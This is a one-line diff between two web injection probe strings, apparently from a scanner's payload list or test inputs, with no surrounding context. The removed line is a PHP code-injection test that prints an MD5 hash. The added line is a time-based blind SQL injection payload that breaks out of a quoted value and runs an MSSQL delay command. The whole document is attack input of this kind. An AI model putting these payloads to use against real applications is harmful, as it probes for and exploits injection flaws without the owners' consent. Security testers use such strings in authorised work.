@@ -1,1 +1,1 @@
-'.print(md5(31337)).'
+555ELKXeIlH'; waitfor delay '0:0:15' -- 
